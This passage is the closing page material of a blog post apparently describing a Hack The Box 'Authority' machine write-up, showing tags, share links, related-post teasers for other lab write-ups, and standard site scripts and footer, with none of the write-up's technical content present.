</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/esc1/" class="post-tag no-text-decoration" >ESC1</a> <a href="/tags/smbmap/" class="post-tag no-text-decoration" >smbmap</a> <a href="/tags/smbclient/" class="post-tag no-text-decoration" >smbclient</a> <a href="/tags/passthecert/" class="post-tag no-text-decoration" >PassTheCert</a> <a href="/tags/ansible/" class="post-tag no-text-decoration" >Ansible</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Authority%20-%20Niraj%20Maharjan&url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Authority%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20Authority%20-%20Niraj%20Maharjan&u=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Authority%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Authority%2F&text=Hack%20The%20Box%20-%20Authority%20-%20Niraj%20Maharjan" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Authority%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hack-The-Box-Authority/">Hack The Box - Authority</a><li><a href="/posts/HAck-the-Box-Photobomb/">Hack The Box - Photobomb</a><li><a href="/posts/Hack-The-Box-Querier/">Hack The Box - Querier</a><li><a href="/posts/Ejptv2/">eLearnSecurity - eJPTv2</a><li><a href="/posts/Hack-The-Box-Hiest/">Hack The Box - Heist</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Hack-The-Box-Forest/"><div class="card-body"> <em class="small" data-ts="1751688000" data-df="ll" > Jul 5, 2025 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Forest</h3><div class="text-muted small"><p> Forest is an easy Windows machine. It is a domain controller that allows us to enumerate users over RPC, attack Kerberos with AS-REP Roasting for a service account, and gain an initial foothold. Th...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Active/"><div class="card-body"> <em class="small" data-ts="1674018000" data-df="ll" > Jan 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Active</h3><div class="text-muted small"><p> RECON NMAP Starting with nmap, nmap shows a bunch of open ports and the target is Active Directory Domain Controller running on Windows Server 2008 R2 SP1. $sudo nmap -sT -p- -oA alltcp 10.10...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Timelapse/"><div class="card-body"> <em class="small" data-ts="1674882000" data-df="ll" > Jan 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Timelapse</h3><div class="text-muted small"><p> RECON NMAP Nmap shows multiple ports open. Since ldap, kerberos, DNS and SMB ports are open it’s probably a Domain Controller. Nmap script shows that the domain name is timelapse.htb $nmap -Pn...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Hack-The-Box-Shoppy/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Shoppy</p></a> <a href="/posts/Hack-The-Box-Forest/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Forest</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://niraj-maharjan.com.np/posts/Hack-The-Box-Authority/'; this.page.identifier = '/posts/Hack-The-Box-Authority/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver( function (entries) { if (entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://nirazzz.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] } ); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* Disqus hasn't been loaded */ if (typeof DISQUS === 'undefined') { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } } if (document.querySelector('.mode-toggle')) { window.addEventListener('message', reloadDisqus); } </script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/username">Niraj Maharjan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
